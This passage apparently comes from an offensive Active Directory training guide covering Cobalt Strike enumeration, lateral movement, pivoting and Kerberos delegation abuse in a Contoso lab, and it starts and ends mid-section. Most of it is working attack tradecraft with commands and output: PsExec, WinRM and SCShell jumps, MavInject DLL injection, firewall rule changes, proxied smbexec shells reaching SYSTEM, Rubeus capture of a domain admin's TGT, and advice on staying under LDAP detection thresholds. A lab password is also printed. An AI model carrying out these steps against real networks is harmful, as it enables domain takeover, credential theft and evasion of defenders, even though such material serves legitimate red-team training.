--------------------
sAMAccountName: Domain Users

The chain query above returns the ancestors of Domain Admins. The output illustrates a flat nesting pitfall — Domain Users → Workstation Admins → Server Admins → Domain Admins effectively grants every user Domain Admin.

11.1.2 OPSEC

Beyond signatured queries, detection thresholds for expensive, inefficient, or slow queries are org-defined and depend on domain size — there are no universal safe values.

Expensive Search Results Threshold

Queries that return more results than the threshold — e.g. extremely broad pulls like (objectClass=*) — trigger logging.

Search Time Threshold

Query time scales with result count and attribute count. *,ntsecuritydescriptor is the slowest combination — reduce to essentials (samaccounttype,distinguishedname,objectsid,ntsecuritydescriptor) to stay under the threshold.

Inefficient Search Results Threshold

Queries that return less than 10% of the visited objects when the visit count exceeds the threshold are flagged as inefficient. A kerberoastable-users filter like (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) still visits every user object — it's only efficient if SPN-enabled accounts exceed 10% of the user count.

Workaround: fetch all users with a minimal attribute list in one efficient query and filter offline. Only the expensive-results threshold then applies.

11.2 BOFHound

Despite the name, BOFHound is not a BOF — it's a Python script that parses the raw output of the ldapsearch BOF and a few other LDAP tools.

11.2.1 Query Methodology

The objective is to build a picture of the environment over days or weeks using small, efficient queries. Start with basic information about the domain, computers, users, groups, OUs, and GPOs:

beacon> ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor

BOFHound parses raw Cobalt Strike logs from the team server. Copy them locally first:

attacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/Desktop$ scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .
attacker@10.0.0.5's password: Passw0rd!

Run BOFHound against the copied log directory:

attacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/Desktop$ bofhound -i logs/
attacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/Desktop$ ls -l

-rwxrwxrwx 1 attacker attacker 16072 Mar 12 12:06 computers_20250312_120659.json
-rwxrwxrwx 1 attacker attacker  1803 Mar 12 12:06 domains_20250312_120659.json
-rwxrwxrwx 1 attacker attacker 13792 Mar 12 12:06 gpos_20250312_120659.json
-rwxrwxrwx 1 attacker attacker 34772 Mar 12 12:06 groups_20250312_120659.json
drwxrwxrwx 1 attacker attacker  4096 Mar 12 12:06 logs
-rwxrwxrwx 1 attacker attacker  5690 Mar 12 12:06 ous_20250312_120659.json
-rwxrwxrwx 1 attacker attacker 21889 Mar 12 12:06 users_20250312_120659.json

After logging into the BloodHound UI, upload the parsed JSON files via Administration > File Ingest. Once processed, query for kerberoastable users with:

MATCH (n:User) WHERE n.hasspn=true RETURN n

Objects shown only as a SID or "no name or id" haven't been collected yet. Target them specifically with (objectsid=[SID]) --attributes *,ntsecuritydescriptor.

11.2.2 Restricted groups

LDAP alone cannot return restricted group data — these are local group memberships defined by GPO and stored in SYSVOL. Without parsing GPO content, BloodHound misses those edges and computer properties show no local admins for hosts where membership is GPO-defined.

Browse to a GPO's gPCFileSysPath in SYSVOL and inspect the policy files. GPO content uses a mix of formats (.pol, .xml, .inf). Restricted group data lives in GptTmpl.inf under the Machine's SecEdit folder — e.g. \\contoso.com\SysVol\contoso.com\Policies\{7A04B429-D293-45E8-A7BA-D630415B3D6A}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf. Sample content:

[Unicode]
Unicode=yes
[Version]
signature="$CHICAGO$"
Revision=1
[Group Membership]
*S-1-5-21-3926355307-1661546229-813047887-1107__Memberof = *S-1-5-32-544
*S-1-5-21-3926355307-1661546229-813047887-1107__Members =

The domain group S-1-5-21-...-1107 is a member of the local group S-1-5-32-544. BloodHound resolves the domain SID to a Server Admins group; Microsoft's well-known SID list identifies S-1-5-32-544 as the built-in Administrators group. So every member of Server Admins is a local admin on computers in the Member Servers OU. Add the edge to BloodHound with a Cypher query:

MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-1110'})
MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1107'})
MERGE (y)-[:AdminTo]->(x)

11.2.3 WMI Filters

WMI filters add conditional logic to GPO application — e.g. restrict to a Windows version or computer name. A GPO may appear to apply by OU membership but be excluded by a WMI filter, so always check filters during GPO analysis.

The relationship is one-to-many — a GPO can have at most one WMI filter; one filter can apply to many GPOs. A filter is applied by setting the GPO's gPCWQLFilter attribute:

beacon> ldapsearch (objectClass=groupPolicyContainer) --attributes displayname,gPCWQLFilter

displayName: AppLocker
gPCWQLFilter: [contoso.com;{E91C83FB-ADBF-49D5-9E93-0AD41E05F411};0]

WMI filters are stored in CN=System,CN=WmiPolicy,CN=SOM as class msWMI-Som. Display name: msWMI-Name; filter content: msWMI-Parm2.

beacon> ldapsearch (objectClass=msWMI-Som) --attributes name,msWMI-Name,msWMI-Parm2 --dn "CN=SOM,CN=WMIPolicy,CN=System,DC=contoso,DC=com"

Binding to 10.10.120.1

[*] Distinguished name: CN=SOM,CN=WMIPolicy,CN=System,DC=contoso,DC=com
[*] targeting DC: \\lon-dc-1.contoso.com
[*] Filter: (objectClass=msWMI-Som)
[*] Scope of search value: 3
[*] Returning specific attribute(s): name,msWMI-Name,msWMI-Parm2

--------------------
name: {E91C83FB-ADBF-49D5-9E93-0AD41E05F411}
msWMI-Name: Windows 10+
msWMI-Parm2: 1;3;10;61;WQL;root\CIMv2;SELECT * from Win32_OperatingSystem WHERE Version like "10.%";

If this GPO were linked to an OU containing Windows 7, Vista, or 8 hosts, the filter would exclude them — the GPO wouldn't apply despite the link.

12. Lateral Movement

Lateral Movement [TA0008] uses legitimate remote management protocols and admin credentials to reach other hosts on the network. Choice of primitive (WMI, PsExec, WinRM, DCOM, scheduled tasks) depends on the credential material held and the artefact trail acceptable for the engagement. Typical flow: upload payload → execute remotely.

Cobalt Strike provides two base primitives:

  • jump — high-level: handles payload upload, execution, and cleanup in one command
  • remote-exec — low-level: runs a single command on a remote host, leaves payload staging to the operator

jump

jump automates every step required to land a new Beacon on a target — upload the payload, register a service, kick off execution, and (for some techniques) clean up. Syntax: jump [exploit] [target] [listener]. Running jump with no arguments lists the available techniques (CS labels them "exploits"):

beacon> jump

Beacon Remote Exploits
======================

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM

remote-exec

remote-exec is the lower-level primitive — it runs a command on a target but leaves payload upload and post-exec setup to the operator. Syntax: remote-exec [method] [target] [command]:

beacon> remote-exec

Beacon Remote Execute Methods
=============================

    Methods                         Description
    -------                         -----------
    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI

remote-exec is useful when a technique cannot be reliably wrapped in jump.

12.1 Windows Remote Management

Windows Remote Management (WinRM) is Microsoft's WS-Management implementation, allowing remote management via PowerShell. WinRM-based jumps execute entirely in memory — no disk artefact:

beacon> jump winrm64 lon-ws-1 smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337) on lon-ws-1 via WinRM
[+] established link to child beacon: 10.10.120.10

WinRM is also the only remote-exec method that returns command output, making it useful for remote enumeration:

beacon> remote-exec winrm lon-ws-1 net sessions
[*] Tasked beacon to run 'net sessions' on lon-ws-1 via WinRM

Computer               User name            Client Type       Opens Idle time

-------------------------------------------------------------------------------
\\10.10.120.101        rsteel                                     1 00:00:07

12.2 PsExec

Named after the Sysinternals tool, the PsExec technique executes processes on a remote system via the Service Control Manager. It's the only built-in lateral movement method that writes to disk. The flow:

  1. Upload a service binary to \\target\ADMIN$
  2. Create a service that spawns a temporary process
  3. The process injects Beacon shellcode and exits
  4. The service and binary are cleaned up immediately afterwards
beacon> jump psexec64 lon-ws-1 smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337) on lon-ws-1 via Service Control Manager (\\lon-ws-1\ADMIN$\08453ee.exe)

Started service 08453ee on lon-ws-1
[+] established link to child beacon: 10.10.120.10

PsExec is one of the loudest lateral movement techniques — new service creations are relatively rare in normal operations and are a high-fidelity detection.

12.3 Custom Techniques

jump and remote-exec can both be extended via Aggressor Script to add custom techniques, leveraging any Beacon post-ex capability — PowerShell scripts, .NET assemblies, BOFs, and reflective DLLs.

12.3.1 SCShell

Charles Hamilton's SCShell implements a stealthier PsExec variant — it temporarily modifies an existing service to run the payload, then restores the original config. No new service is created.

Load C:\Tools\SCShell\CS-BOF\scshell.cna via Cobalt Strike > Script Manager to register the scshell/scshell64 exploits (uses beacon_remote_exploit_register).

beacon> jump scshell64 lon-ws-1 smb
[*] Tasked beacon to jump to lon-ws-1 (windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337)) via SCShell

Trying to connect to lon-ws-1
SC_HANDLE Manager 0x000001EE3EBD50F0
Opening defragsvc
SC_HANDLE Service 0x000001EE3EBD5120
LPQUERY_SERVICE_CONFIGA need 0x00000142 bytes
Original service binary path "C:\Windows\system32\svchost.exe -k defragsvc"
Service path was changed to "C:\Windows\System32\evil81.exe"
Service was started
Service path was restored to "C:\Windows\system32\svchost.exe -k defragsvc"

[+] established link to child beacon: 10.10.120.10

Custom techniques are valuable for simulating specific TTPs not built into Cobalt Strike, or for working around detections on the default techniques.

12.4 LOLBAS

LOLBAS are Windows-native or Microsoft-signed binaries and scripts with functionality useful to attackers (arbitrary code execution, file download, etc.). They blend with legitimate admin activity.

12.4.1 MavInject

mavinject.exe is a Microsoft-signed executable shipped for App-V, present in System32 and SysWOW64 on default installs. It injects an arbitrary DLL into a target process via mavinject.exe [PID] /INJECTRUNNING [DLL PATH]. List running processes on the remote target first:

beacon> remote-exec winrm lon-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id

Id             : 1992
ProcessName    : spoolsv
UserName       : NT AUTHORITY\SYSTEM

Id             : 2280
ProcessName    : CompatTelRunner
UserName       : NT AUTHORITY\SYSTEM

Id             : 2588
ProcessName    : AggregatorHost
UserName       : NT AUTHORITY\SYSTEM

[...snip...]

Upload a DLL payload to the target and inject it into the chosen process with MavInject:

beacon> cd \\lon-ws-1\ADMIN$\System32
beacon> upload C:\Payloads\smb_x64.dll

beacon> remote-exec wmi lon-ws-1 mavinject.exe 1992 /INJECTRUNNING C:\Windows\System32\smb_x64.dll
Started process 1608 on lon-ws-1

beacon> link lon-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
[+] established link to child beacon: 10.10.120.10

12.4.2 OPSEC

LOLBAS are well-detected in mature environments — blocked via AppLocker/WDAC or logged via Sysmon. More applicable to adversary emulation than simulation.

12.5 Security Logon Types

After moving laterally via WinRM, Kerberos-dependent tools like PowerView's Get-DomainTrust fail because the session has no TGT:

[+] established link to parent beacon: 10.10.120.101
 
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powerpick Get-DomainTrust

ERROR: Exception calling "FindOne" with "0" argument(s): "An operations error occurred.
ERROR: "
ERROR: At line:6330 char:50
ERROR: + ... $PSBoundParameters['FindOne']) { $Results = $CompSearcher.FindOne() }
ERROR: +                                      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
ERROR:     + FullyQualifiedErrorId : DirectoryServicesCOMException
ERROR:  
ERROR: Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
ERROR: "
ERROR: At line:19691 char:24
ERROR: +                 else { $Results = $TrustSearcher.FindAll() }
ERROR: +                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
ERROR:     + FullyQualifiedErrorId : DirectoryServicesCOMException
ERROR:

This is a consequence of Windows logon types, not a bug. The common types:

  • Interactive (2) — physical console logon; credentials cached in LSASS
  • Network (3) — authenticate to a network resource; credentials not cached on the target
  • Batch (4) — scheduled task; credentials cached
  • Service (5) — service start; credentials cached
  • NetworkCleartext (8) — IIS Basic, plaintext credentials sent; cached
  • NewCredentials (9) — runas /netonly; credentials used for outbound only
  • RemoteInteractive (10) — RDP; credentials cached

The key OPSEC distinction: only the Network logon type does not store credentials in LSASS on the remote target. WinRM and PsExec both use Network logon — a significant advantage for lateral movement, but it means Kerberos-dependent tooling won't work natively in the new session. The only ticket present is the HTTP service ticket used to authenticate to WinRM:

Cached Tickets: (1)

#0>	Client: rsteel @ CONTOSO.COM
	Server: HTTP/lon-ws-1 @ CONTOSO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize 
	Start Time: 2/18/2025 10:43:31 (local)
	End Time:   2/18/2025 20:43:31 (local)
	Renew Time: 0
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x8 -> ASC 
	Kdc Called:

Network logons don't cache TGTs, so the session cannot request service tickets for domain resources. Use make_token or ptt to inject credentials before Kerberos-based enumeration. Often the cleaner option is to perform the enumeration from a session that already has credential material — e.g. the source Beacon — rather than fixing the credential state on the lateral session.

13. Pivoting

Pivoting [T1090] proxies traffic in or out of a network through a compromised host, reaching segments with no direct route to the team server. The two types covered here are SOCKS proxies (for outbound from the attacker) and Beacon's pivot listeners (for inbound to compromised hosts).

13.1 SOCKS

SOCKS (SOCKet Secure) proxies network packets between a client and server. Beacon can act as a SOCKS proxy, routing the operator's traffic to internal hosts via the C2 channel. Three advantages of SOCKS tunnelling:

  • Platform compatibility — run Python and Linux tools that don't run natively on Windows
  • Reduced detection surface — BOF, assembly, and DLL execution on a host creates AV-visible indicators; tunnelling leaves only network traffic
  • GUI tooling — run RSAT and other GUI tools directly from the attacker machine

13.1.1 Start the SOCKS proxy

beacon> socks 1080
[+] started SOCKS4a server on: 1080

13.1.2 Proxifier on Windows

Proxifier forces TCP traffic on Windows through a proxy without per-application configuration. Workflow:

  1. Profile > Proxy Servers — add a profile with the team server IP, the port and protocol matching the socks command.
  2. Add a Proxification Rule — leave Applications as Any and specify the target IP range or domains, so only traffic destined for the internal network routes through the proxy.

Launch a tool like C:\Tools\SysinternalsSuite\ADExplorer64.exe and connect to a target DC with explicit credentials — Proxifier tunnels the traffic and AD Explorer renders the directory.

Authentication

Authenticate through SOCKS via plaintext credentials or Kerberos tickets (NTLM is deprecated tradecraft). Kerberos requires hostnames — add static host entries on your attacking machine before use:

PS C:\Users\Attacker> Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.1 lon-dc-1'

RSAT PowerShell cmdlets work on any Windows machine. Create a credential object via Get-Credential and pass it to RSAT cmdlets to authenticate as a target user without needing to be domain-joined.

PS C:\Users\Attacker> $Cred = Get-Credential CONTOSO.COM\rsteel
PS C:\Users\Attacker> Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Credential $Cred -Server lon-dc-1

DistinguishedName : CN=krbtgt,CN=Users,DC=contoso,DC=com
Enabled           : False

Surname           : Service
UserPrincipalName : mssql_svc@contoso.com

To leverage Kerberos tickets, start a new process with a fake password using Rubeus createnetonly and the /show parameter.

PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /domain:CONTOSO.COM /username:rsteel /password:FakePass /program:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /ticket:C:\Users\Attacker\Desktop\rsteel.kirbi /show

Rubeus klist in the new window will confirm the ticket has been injected.

PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist

We also need to request service tickets manually, rather than relying on Windows doing it magically for us. For example, to query Active Directory, use asktgs to get a ticket for LDAP and pass it directly into this logon session.

13.1.3 Proxychains on Linux

Proxychains forces TCP traffic made by a given application to route through a proxy. Edit /etc/proxychains.conf:

  1. Line 38 — comment out proxy_dns
  2. Line 64 — replace the default socks4 127.0.0.1 9050 with the team server SOCKS endpoint, e.g. socks4 10.0.0.5 1080

Wrap any TCP tool with proxychains:

attacker@DESKTOP-FGSTPS7:~$ proxychains nmap -n -sT -Pn -p 445 lon-dc-1
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-28 13:03 UTC
|S-chain|-<>-10.0.0.5:1080-<><>-10.10.120.1:445-<><>-OK
Nmap scan report for lon-dc-1 (10.10.120.1)
Host is up (0.12s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds

Spawn a remote shell via Impacket with plaintext credentials:

attacker@DESKTOP-FGSTPS7:~$ proxychains smbexec.py 'CONTOSO/rsteel:Passw0rd!@lon-ws-1'
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

|S-chain|-<>-10.0.0.5:1080-<><>-10.10.120.10:445-<><>-OK
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>hostname
lon-ws-1

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>exit
Authentication

Impacket (and other Linux tools) can also use Kerberos tickets, but they need to be in ccache format. ticketConverter.py can convert from kirbi to ccache and vice versa.

attacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/Desktop$ ticketConverter.py rsteel.kirbi rsteel.ccache
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] converting kirbi to ccache...
[+] done

Export KRB5CCNAME to point at the ticket:

attacker@DESKTOP-FGSTPS7:~$ export KRB5CCNAME=/mnt/c/Users/Attacker/Desktop/rsteel.ccache

Use Impacket's -no-pass, -k, and -dc-ip instead of a plaintext password:

attacker@DESKTOP-FGSTPS7:~$ proxychains smbexec.py -no-pass -k -dc-ip lon-dc-1 CONTOSO.COM/rsteel@lon-ws-1
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

|S-chain|-<>-10.0.0.5:1080-<><>-10.10.120.10:445-<><>-OK
|S-chain|-<>-10.0.0.5:1080-<><>-10.10.120.1:88-<><>-OK
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>

13.2 Reverse Port Forwards

Reverse port forwards are the inverse of SOCKS — they tunnel traffic out from inside the network. Useful when a target host is restricted from reaching the Internet; route its traffic through a Beacon it can reach. Syntax: rportfwd [bind port] [forward host] [forward port].

A common use case is a target with RCE but no outbound Internet access. PowerShell download cradles normally fetch payloads from an external host — when that's blocked, host the payload behind a reverse port forward on a reachable Beacon. Demonstrate the block first by attempting a direct download from lon-ws-1:

beacon> make_token CONTOSO\rsteel Passw0rd!
beacon> remote-exec winrm lon-ws-1 iwr http://www.bleepincomputer.com/test

This returns "Unable to connect to the remote server".

Reverse port forwards on high ports (>1024) don't require local admin to bind. Well-known ports (80, 443, 8080) do. The main hurdle is the Windows firewall — inbound rules require local admin. Add a rule for port 28190:

beacon> run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=28190

Start the reverse port forward — the team server will route traffic to its own internal web server on port 80:

beacon> rportfwd 28190 localhost 80
[+] started reverse port forward on 28190 to localhost:80

Run iwr on lon-ws-1 again, pointing at lon-wkstn-1 on the reverse port forward port:

beacon> remote-exec winrm lon-ws-1 iwr http://lon-wkstn-1:28190/test

This returns a 404 and a matching record appears in View > Web Log:

02/19 11:09:44 visit (port 80) from: 127.0.0.1
	Request: GET /test
	Response: 404 Not Found
	Mozilla/5.0 (Windows NT; Windows NT 10.0; en-GB) WindowsPowerShell/5.1.20348.2849

To clean up, stop the reverse port forward and remove the firewall rule:

beacon> rportfwd stop 28190
beacon> run netsh advfirewall firewall delete rule name="Debug"

14. Active Directory Enumeration

BloodHound is the primary tool for mapping AD attack paths — SharpHound collects the raw data, BloodHound visualises it. PowerView and LDAP queries fill the gaps for targeted enumeration of ACLs, group membership, GPOs, and trust relationships. Build the full picture before you start attacking.

14.1 BloodHound & SharpHound

SharpHound is the ingestor — it queries LDAP and SMB to collect AD objects and their relationships. BloodHound visualises that data as a graph. Run SharpHound from a Beacon session and transfer the ZIP to your attack machine for analysis.

# Run SharpHound from a Beacon — collect all data types
execute-assembly SharpHound.exe -c All --zipfilename loot.zip

# Download the ZIP
download loot.zip

# Reduced noise — query DC only, no lateral SMB
execute-assembly SharpHound.exe -c DCOnly --zipfilename dc_only.zip

# Key BloodHound queries:
# Find Shortest Paths to Domain Admins
# Find All Domain Admins
# List All Kerberoastable Accounts
# Find Principals with DCSync Rights

14.1.1 SharpHound Collection Methods

MethodWhat it collectsNoise level
AllEverything belowHigh
DCOnlyQueries only the DC — no SMB to workstationsLow
SessionActive user sessions on hosts (connects to each host)High
ACLObject ACLs — who can write/own whatMedium
TrustsDomain and forest trust relationshipsLow
ObjectPropsUser/computer object propertiesLow

14.2 PowerView Enumeration

PowerView runs in-memory via PowerShell and provides fine-grained LDAP queries that BloodHound doesn't expose directly. Load it via Beacon's PowerShell import and query from the console.

# Load PowerView into the Beacon session
powershell-import /opt/PowerView.ps1

# Domain info
powershell Get-Domain
powershell Get-DomainController

# Users — find kerberoastable and AS-REP roastable accounts
powershell Get-DomainUser -Properties samaccountname,memberof,description | select samaccountname,memberof,description
powershell Get-DomainUser -SPN
powershell Get-DomainUser -PreauthNotRequired

# Groups
powershell Get-DomainGroupMember "Domain Admins" -Recurse
powershell Get-DomainGroupMember "Enterprise Admins" -Recurse

# Computers
powershell Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp

# GPOs and local admin assignments
powershell Get-DomainGPO | select displayname, gpcfilesyspath
powershell Get-DomainGPOLocalGroup

# OUs
powershell Get-DomainOU | select name, gplink

14.3 ACL Enumeration

Misconfigured ACLs are one of the most common lateral movement paths in mature AD environments. An account with GenericWrite on a user can reset their password; WriteDACL lets you grant yourself any permission you want.

# Find all ACLs where a non-privileged principal has write rights
powershell Find-InterestingDomainAcl -ResolveGUIDs | select ObjectDN, ActiveDirectoryRights, IdentityReferenceName

# Check ACLs for a specific user
powershell Get-DomainObjectAcl -Identity targetuser -ResolveGUIDs | select SecurityIdentifier, ActiveDirectoryRights

14.3.1 High-Value ACL Rights

RightTargetExploitation
GenericAllUserReset password or add to group
GenericAllComputerResource-based constrained delegation abuse
GenericAllGroupAdd yourself to the group
WriteDACLDomainGrant DCSync rights to any account
WriteOwnerObjectTake ownership then grant GenericAll to self
AllExtendedRightsUserForce password reset
DS-Replication-Get-Changes-AllDomainDCSync — dump all domain credentials

14.4 LDAP Queries

# Domain trusts
powershell Get-DomainTrust | select SourceName, TargetName, TrustDirection, TrustType

# Foreign group members (cross-domain accounts in local groups)
powershell Get-DomainForeignGroupMember

# Constrained delegation — both user and computer objects
powershell Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
powershell Get-DomainComputer -TrustedToAuth | select dnshostname, msds-allowedtodelegateto

# Unconstrained delegation — non-DCs only (DCs always have it)
powershell Get-DomainComputer -Unconstrained | select dnshostname

# AdminSDHolder-protected accounts
powershell Get-DomainObject -SearchBase "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -ResolveGUIDs

15. Active Directory Exploitation

AD exploitation in mature environments hinges on Kerberos abuse, ADCS misconfigs, and trust traversal. This section covers the full chain: Kerberoasting → delegation abuse → DCSync → ESC1-8 → inter-forest trusts.

15.1 Kerberos

Kerberos is the default Windows domain authentication protocol. It uses tickets rather than passwords for service access; the KDC (domain controllers) is the trusted authority.

ConceptDescription
PrincipalUser or computer that authenticates
KDCKey Distribution Centre — runs on DCs; holds all account password hashes
TGTTicket-Granting Ticket — proves identity; encrypted with krbtgt hash; cached in LSASS
TGS / service ticketGrants access to a specific service; encrypted with service account hash
SPNService Principal Name — identifies the service (e.g. MSSQLSvc/host:1433)
PACPrivilege Attribute Certificate — embedded in tickets; contains user SID and group memberships
AS-REQ/REPAuthentication Service exchange — client requests TGT; KDC returns TGT + logon session key
TGS-REQ/REPTicket-Granting Service exchange — client presents TGT to get a service ticket
AP-REQ/REPApplication exchange — client presents service ticket to the actual service

15.1.1 Authentication Overview

The standard cross-component flow:

  1. Client sends AS-REQ (encrypted timestamp for pre-auth)
  2. KDC returns AS-REP: TGT + logon session key (key encrypted with client hash)
  3. Client sends TGS-REQ: TGT + authenticator encrypted with logon session key
  4. KDC returns TGS-REP: service ticket + service session key
  5. Client sends AP-REQ: service ticket + authenticator encrypted with service session key
  6. Service validates; optionally returns AP-REP for mutual auth

Abuse relevance:

  • Kerberoasting — request a TGS for any SPN; crack the service account hash offline (TGS encrypted with service account hash)
  • AS-REP Roasting — request a TGT for accounts with pre-auth disabled; crack the encrypted session key (encrypted with account hash)
  • Golden Ticket — forge a TGT using the krbtgt hash; impersonate any user in the domain
  • Silver Ticket — forge a TGS using a service account hash; PAC not validated by the service → impersonate any user to the service
  • Pass-the-Ticket — steal TGT/TGS from LSASS memory and use it directly
  • Overpass-the-Hash / Pass-the-Key — use NTLM/AES hash to request a TGT (converts hash to Kerberos ticket)

15.2 Unconstrained Delegation

Kerberos delegation lets a service authenticate to a back-end resource on the user's behalf — e.g. a web app querying a database using the user's identity rather than its own service account. The web server can't request an MSSQLSvc ticket for the user directly because it doesn't know the user's secret. Modern Windows supports three delegation flavours:

  • Unconstrained — the front-end caches the user's TGT and can request any service ticket on their behalf
  • Constrained — the front-end can only request tickets for the SPNs listed in msDS-AllowedToDelegateTo
  • Resource-based constrained — the back-end specifies which accounts can delegate to it via msDS-AllowedToActOnBehalfOfOtherIdentity

This section focuses on unconstrained — the original (and most dangerous) variant. It's enabled by setting TRUSTED_FOR_DELEGATION on the userAccountControl attribute of the computer object:

beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname

sAMAccountName: CONT-DC-1$
sAMAccountName: CONT-WEB-1$

When a service ticket is requested for an SPN on an unconstrained-delegation host, the DC sets ok-as-delegate in the TGS-REP. The client then includes a copy of its TGT in the AP-REQ. The host caches that TGT in memory and can use it to request tickets on the user's behalf.

Compromising an unconstrained delegation host gives access to all TGTs cached in memory — an adversary can impersonate any authenticated user across any service in the domain.

Rubeus' monitor command periodically captures and displays TGTs as users authenticate:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap

[*] 19/02/2025 14:56:32 UTC - Found new TGT:

  User                  :  dyork@CONTOSO.COM
  StartTime             :  19/02/2025 14:56:16
  EndTime               :  20/02/2025 00:56:16
  RenewTill             :  26/02/2025 14:56:16
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFj[...snip...]kNPTQ==

The captured TGT belongs to the domain administrator dyork. Stop the Rubeus job with jobs and jobkill:

beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 0    2468  .NET assembly

beacon> jobkill 0
[+] job 0 completed

15.3 Constrained Delegation

The Service for User (S4U) Kerberos extension was introduced in Server 2003 as a replacement for unconstrained delegation. It provides two protocols:

  • S4U2self — request a service ticket for an arbitrary user to the requesting service itself
  • S4U2proxy — present a forwardable service ticket and request a ticket to a different SPN

Constrained delegation restricts delegation to the SPNs listed in msDS-AllowedToDelegateTo on the computer object — no user TGT is required. Enumerate constrained-delegation computers with ldapsearch:

beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo

sAMAccountName: LON-WS-1$
msDS-AllowedToDelegateTo: cifs/lon-fs-1.contoso.com, cifs/lon-fs-1

15.3.1 Kerberos only

With Kerberos-only authentication, the flow is:

  1. Client requests a service ticket for the front-end and presents it via AP-REQ
  2. Front-end caches the ticket for reuse
  3. To reach a back-end, the front-end sends a TGS-REQ containing the cached user ticket
  4. KDC verifies the front-end's msDS-AllowedToDelegateTo contains the target SPN; if so, it returns a service ticket for the back-end
  5. Front-end uses that ticket to authenticate to the back-end as the user

This is S4U2proxy.

15.3.2 Protocol transition

Protocol transition requires the TRUSTED_TO_AUTH_FOR_DELEGATION flag on the computer's UAC attribute. The default workstation UAC value is 4096 (WORKSTATION_TRUST_ACCOUNT) — any other value indicates additional flags are set:

beacon> ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl

userAccountControl: 16781312

Check flags with bitwise AND in PowerShell: [System.Convert]::ToBoolean(<uac_value> -band <flag_value>). TRUSTED_TO_AUTH_FOR_DELEGATION is 16777216 (0x1000000).

When protocol transition is enabled, the user typically authenticates to the front-end with a non-Kerberos protocol such as NTLM — so the front-end has no cached user ticket to forward. Instead, it sends a TGS-REQ specifying the user's username with the SPN set to its own sAMAccountName (e.g. pchilds@lon-ws-1$). The KDC returns a service ticket — this is S4U2self. The returned ticket is then used in a S4U2proxy request as above.

15.3.3 Attacking S4U

Compromising a constrained delegation computer allows requesting service tickets for the SPNs in msDS-AllowedToDelegateTo. The procedure differs depending on whether protocol transition is enabled.

With protocol transition

With protocol transition enabled: obtain a computer account TGT → S4U2self with any username → forwardable service ticket → S4U2proxy to the target service. Grants access as the impersonated user.

Rubeus performs both the S4U2self and S4U2proxy steps in one s4u invocation:

